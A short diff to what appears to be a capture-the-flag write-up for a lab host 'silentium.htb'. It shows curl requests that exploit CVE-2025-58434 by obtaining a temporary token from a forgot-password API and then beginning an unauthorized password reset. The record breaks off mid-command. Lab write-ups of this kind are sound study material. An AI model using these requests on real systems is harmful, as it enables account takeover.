@@ -5,7 +5,7 @@
     Valid user identification via web common enumeration
 ## CVE-2025-58434 Exploitation and Initial Access
     `curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password  -H "Content-Type: application/json" -d '{"user": {"email": "ben@silentium.htb"}}'`
-    API returned TempToken, used for later unauthorized password reset
+## API returned TempToken, used for later unauthorized password reset
     `curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
     -H "Content-Type: application/json" \
     -d '{
